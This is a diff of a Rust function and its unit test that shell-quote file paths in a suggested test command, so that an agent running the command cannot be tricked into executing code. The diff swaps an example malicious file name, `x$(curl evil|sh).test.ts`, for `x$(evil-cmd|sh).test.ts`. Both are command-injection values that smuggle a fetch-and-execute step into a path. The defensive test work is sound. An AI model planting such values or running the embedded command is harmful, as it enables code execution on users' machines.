@@ -676,7 +676,7 @@ pub(crate) fn verify_command_for_discovery(
 ///
 /// The primary consumer of the suggested command is an agent that may run it
 /// verbatim in a POSIX-like shell, so a hostile file name such as
-/// `x$(curl evil|sh).test.ts` (legal on Linux) must not become a
+/// `x$(evil-cmd|sh).test.ts` (legal on Linux) must not become a
 /// copy-paste code-execution vector. Plain alphanumeric/relative paths pass
 /// through unchanged so the common command stays readable; anything else is
 /// single-quoted with embedded single quotes escaped POSIX-style (`'\''`),
@@ -1487,10 +1487,10 @@ mod tests {
         // suggested command verbatim.
         let discovery = make_discovery(Some("."), Some(TsFramework::Jest), None);
         let result =
-            verify_command_for_discovery(&discovery, Path::new("tests/x$(curl evil|sh).test.ts"));
+            verify_command_for_discovery(&discovery, Path::new("tests/x$(evil-cmd|sh).test.ts"));
         assert_eq!(
             result,
-            Some("jest 'tests/x$(curl evil|sh).test.ts'".to_string()),
+            Some("jest 'tests/x$(evil-cmd|sh).test.ts'".to_string()),
             "metacharacters must be neutralized by single-quoting"
         );
     }
